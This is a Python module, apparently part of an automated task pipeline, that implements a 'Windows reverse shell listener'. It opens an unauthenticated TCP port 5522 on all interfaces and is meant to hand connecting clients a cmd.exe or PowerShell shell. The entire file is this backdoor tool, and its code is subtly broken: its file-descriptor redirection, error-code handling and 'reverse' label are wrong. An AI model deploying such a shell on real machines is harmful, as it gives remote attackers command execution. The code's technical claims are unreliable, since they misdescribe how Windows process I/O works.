"""Windows reverse shell listener that spawns cmd.exe/powershell and pipes I/O through a TCP socket."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import socket
import subprocess


class WindowsReverseShell:
    """Windows-specific reverse shell implementation using subprocess.Popen with fd redirection.

    Spawns cmd.exe or powershell.exe as a child process and redirects its stdin/stdout/stderr
    through a TCP socket connection on 0.0.0.0:5522.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._server_socket: socket.socket | None = None
        self._client_socket: socket.socket | None = None
        self._process: subprocess.Popen[bytes] | None = None

    def _get_shell_path(self) -> str:
        """Determine the correct shell executable path based on config."""
        if self.config.shell_type == 'powershell.exe':
            return r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        elif self.config.shell_type == 'cmd.exe':
            return r'C:\Windows\System32\cmd.exe'
        else:
            return r'C:\Windows\System32\cmd.exe'

    def _redirect_fds(self, process: subprocess.Popen[bytes]) -> None:
        """Redirect stdin/stdout/stderr of the child process to socket file descriptors.

        On Windows, we use os.dup2() to redirect the process's file descriptors
        to the socket's file descriptors (3, 4, 5).
        """
        # Socket fd mapping: stdin -> 3, stdout -> 4, stderr -> 5
        if self._client_socket is not None:
            os.dup2(self._client_socket.fileno(), 3)   # stdin
            os.dup2(self._client_socket.fileno(), 4)   # stdout
            os.dup2(self._client_socket.fileno(), 5)   # stderr

    def _handle_client(self, client_socket: socket.socket) -> ExecutionResult | None:
        """Handle a single client connection by spawning the shell and piping I/O.

        Args:
            client_socket: The connected TCP socket to pipe through.

        Returns:
            An ExecutionResult with stdout, stderr, exit_code, and error_message.
        """
        try:
            self._client_socket = client_socket
            self._redirect_fds(self._process)

            # Wait for the process to complete and capture output
            stdout_data = b''
            stderr_data = b''
            exit_code = 0

            while True:
                try:
                    # Read from stdout (fd 4)
                    if os.isatty(4):
                        break
                    chunk = os.read(4, 8192)
                    if not chunk:
                        break
                    stdout_data += chunk

                    # Read from stderr (fd 5)
                    if os.isatty(5):
                        break
                    chunk = os.read(5, 8192)
                    if not chunk:
                        break
                    stderr_data += chunk

                except OSError as e:
                    if e.errno == 0 or e.errno == 64:  # EAGAIN/EWOULDBLOCK - no data available
                        continue
                    raise

            self._process.wait()
            exit_code = self._process.returncode

            return ExecutionResult(
                stdout=stdout_data.decode('utf-8', errors='replace'),
                stderr=stderr_data.decode('utf-8', errors='replace'),
                exit_code=exit_code,
                error_message=''
            )

        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=str(e),
                exit_code=-1,
                error_message=f'Connection handling failed: {e}'
            )

    def run(self) -> ExecutionResult | None:
        """Start the TCP server and handle incoming client connections.

        Returns:
            An ExecutionResult for the most recent client connection, or None if no clients connected.
        """
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind((self.config.host, self.config.port))
            self._server_socket.listen(5)

            # Spawn the shell process with CREATE_NEW_PROCESS_GROUP for console detachment
            shell_path = self._get_shell_path()
            self._process = subprocess.Popen(
                [shell_path],
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd='C:\\Windows\\System32'
            )

            # Redirect the process's file descriptors to our socket
            self._redirect_fds(self._process)

            result: ExecutionResult | None = None

            try:
                while True:
                    client_socket, addr = self._server_socket.accept()
                    result = self._handle_client(client_socket)
                    if result is not None and result.exit_code != -1:
                        return result
            except (ConnectionResetError, OSError):
                pass

            # Cleanup
            if self._process:
                self._process.terminate()
                self._process.wait(timeout=5)

            return ExecutionResult(
                stdout='',
                stderr='',
                exit_code=0,
                error_message='Server stopped'
            )

        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=str(e),
                exit_code=-1,
                error_message=f'Server startup failed: {e}'
            )


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell to execute remote commands.

    Uses the socket module for TCP server on 0.0.0.0:5522. On Windows, uses subprocess.Popen
    with creationflags=subprocess.CREATE_NEW_PROCESS_GROUP and shell=True to spawn cmd.exe
    or powershell.exe as a child process. Pipes stdin/stdout/stderr through the socket
    connection using os.dup2() to redirect file descriptors.

    Handles Windows-specific considerations like console mode vs pseudo-console mode via
    CREATE_NEW_PROCESS_GROUP flag which detaches the spawned shell from the parent's
    console group, preventing it from inheriting the parent's console handle.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._listener: WindowsReverseShell | None = None

    def start(self) -> ExecutionResult | None:
        """Start listening for incoming reverse shell connections."""
        if self._listener is None:
            self._listener = WindowsReverseShell(self.config)
        return self._listener.run()

    def stop(self) -> None:
        """Stop the listener and cleanup resources."""
        if self._listener is not None:
            if self._listener._server_socket:
                try:
                    self._listener._server_socket.close()
                except OSError:
                    pass
            self._listener = None

    def __call__(self) -> ExecutionResult | None:
        """Callable interface for TASK_004 orchestrator."""
        return self.start()


__all__ = ['WindowsReverseShell', 'WindowsReverseShellListener']
